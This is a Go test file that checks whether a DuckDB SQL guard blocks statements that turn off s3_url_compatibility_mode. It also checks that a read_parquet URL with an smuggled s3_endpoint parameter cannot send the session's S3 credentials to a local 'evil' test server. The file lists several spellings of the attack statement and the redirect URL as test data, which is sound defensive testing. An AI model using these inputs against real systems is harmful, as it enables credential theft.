package usersql

import (
	"context"
	"database/sql"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/SandwichLabs/assay/internal/session"
)

// #138, end to end in a session whose httpfs loads after the lock (the setting
// is let through the lock there): the editor's text is refused by CheckManaged,
// and if a statement got past it anyway, the re-seal undoes it before the next
// read, so the other host never sees the connection's credential.
func TestPragmaCannotReopenTheURLParameterRedirect(t *testing.T) {
	db, err := sql.Open("duckdb", "")
	require.NoError(t, err)
	var ver, platform string
	require.NoError(t, db.QueryRow("SELECT library_version, platform FROM pragma_version(), pragma_platform()").Scan(&ver, &platform))
	_ = db.Close()
	appDir, _ := session.DefaultDirs()
	home, _ := os.UserHomeDir()
	src := ""
	for _, d := range []string{appDir, filepath.Join(home, ".duckdb", "extensions")} {
		if _, err := os.Stat(filepath.Join(d, ver, platform, "httpfs.duckdb_extension")); err == nil {
			src = d
			break
		}
	}
	if src == "" {
		if os.Getenv("CI") == "true" {
			t.Fatal("httpfs is not installed; CI installs it")
		}
		t.Skip("httpfs is not installed")
	}
	dst := t.TempDir()
	s, err := session.New(session.WithExtensionDirectory(dst)) // httpfs absent: lazy
	require.NoError(t, err)
	t.Cleanup(func() { _ = s.Close() })
	d := filepath.Join(dst, ver, platform)
	require.NoError(t, os.MkdirAll(d, 0o755))
	for _, f := range []string{"httpfs.duckdb_extension", "httpfs.duckdb_extension.info"} {
		b, err := os.ReadFile(filepath.Join(src, ver, platform, f))
		require.NoError(t, err)
		require.NoError(t, os.WriteFile(filepath.Join(d, f), b, 0o644))
	}
	ctx := context.Background()
	require.NoError(t, session.EnsureExtension(ctx, s.DB(), "httpfs", "test"))

	var evilHits atomic.Int32
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		evilHits.Add(1)
		w.WriteHeader(http.StatusForbidden)
	}))
	t.Cleanup(evil.Close)
	good := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusForbidden) }))
	t.Cleanup(good.Close)
	require.NoError(t, s.CreateTemporarySecret(ctx, "assay_lake", "s3", []session.SecretParam{
		{Key: "SCOPE", Value: "s3://lake/"}, {Key: "KEY_ID", Value: "OWNKEYID"}, {Key: "SECRET", Value: "OWNSECRET", Secret: true},
		{Key: "SESSION_TOKEN", Value: "OWNTOKEN", Secret: true}, {Key: "REGION", Value: "us-east-1"},
		{Key: "ENDPOINT", Value: strings.TrimPrefix(good.URL, "http://")}, {Key: "URL_STYLE", Value: "path"}, {Key: "USE_SSL", Value: false},
	}))
	redirect := "s3://lake/x.parquet?s3_endpoint=" + strings.TrimPrefix(evil.URL, "http://") + "&s3_use_ssl=false&s3_url_style=path"

	attacks := []string{
		"PRAGMA s3_url_compatibility_mode=false", "pragma S3_URL_COMPATIBILITY_MODE=false",
		`PRAGMA "s3_url_compatibility_mode"=false`, "PRAGMA s3_url_compatibility_mode = 'false'",
		"SET s3_url_compatibility_mode=false",
	}
	for _, a := range attacks {
		require.Error(t, CheckManaged(a+"; SELECT * FROM read_parquet('"+redirect+"')"), a)
		require.Error(t, Check(a, false), a)
		require.Error(t, CheckParsed(ctx, s.DB(), "SELECT 1; "+a), "the parser layer refuses it on its own: "+a)
	}
	// DuckDB's own parser sees through spellings the tokenizer might not.
	require.Error(t, CheckParsed(ctx, s.DB(), `PRAGMA  "S3_url_compatibility_MODE" =/**/'false'`))
	require.NoError(t, CheckParsed(ctx, s.DB(), "SELECT 1; SET threads = 1; PRAGMA version; SELECT * FROM nope"))

	// Pretend the guard failed: the statement runs, then the re-seal (what the
	// editor does after every run) turns the setting back on before any read.
	_, err = s.DB().ExecContext(ctx, "PRAGMA s3_url_compatibility_mode=false")
	require.NoError(t, err, "in a lazy session the lock lets this one setting through")
	require.NoError(t, session.DenyUncoveredStorage(ctx, s.DB()))
	var v string
	require.NoError(t, s.DB().QueryRow("SELECT CAST(current_setting('s3_url_compatibility_mode') AS VARCHAR)").Scan(&v))
	require.Equal(t, "true", v)
	_, err = s.DB().ExecContext(ctx, "SELECT * FROM read_parquet('"+redirect+"')")
	require.Error(t, err)
	assert.Zero(t, evilHits.Load(), "the other host saw nothing")
}
